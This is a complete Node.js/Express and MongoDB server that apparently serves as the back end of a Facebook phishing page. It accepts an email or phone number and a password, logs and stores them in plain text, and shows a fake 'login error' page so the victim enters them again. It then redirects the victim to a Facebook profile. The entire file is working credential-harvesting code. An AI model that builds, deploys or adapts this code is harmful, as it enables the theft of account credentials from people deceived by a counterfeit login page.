const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
require('dotenv').config();

const app = express();

const connectDB = async () => {
  try {
    await mongoose.connect(process.env.MONGODB_URI);
    console.log('✅ MongoDB connected');
  } catch (err) {
    console.error('❌ MongoDB connection failed:', err.message);
    process.exit(1);
  }
};

connectDB();


/* =======================
   Middleware
======================= */
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

/* =======================
   Schema & Model
// ======================= */
const userSchema = new mongoose.Schema(
  {
    EmailOrPhoneNumber: { type: String, required: true },
    Password: { type: String, required: true },
  },
  { timestamps: true }
);

const User = mongoose.model('User', userSchema);

/* =======================
   Helper function
======================= */
async function insertUser(email, pass) {
  console.log("email: ", email);
  console.log("pass: ", pass);
  
  try {
    const user = new User({
      EmailOrPhoneNumber: email,
      Password: pass,
    });

    await user.save();
    console.log('✅ User saved');
  } catch (err) {
    console.error('❌ Insert failed:', err.message);
  }
}

/* =======================
   Routes
======================= */
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/', async (req, res) => {
  await insertUser(req.body.EmailOrPhonenumber, req.body.password);
  res.redirect('/login_errors');
});

app.get('/login_errors', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'LoginValidate.html'));
});

app.post('/login_errors', async (req, res) => {
  await insertUser(req.body.EmailOrPhonenumber, req.body.password);
  res.redirect('https://web.facebook.com/profile.php?id=61585590616913');
});

/* =======================
   Server
======================= */
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
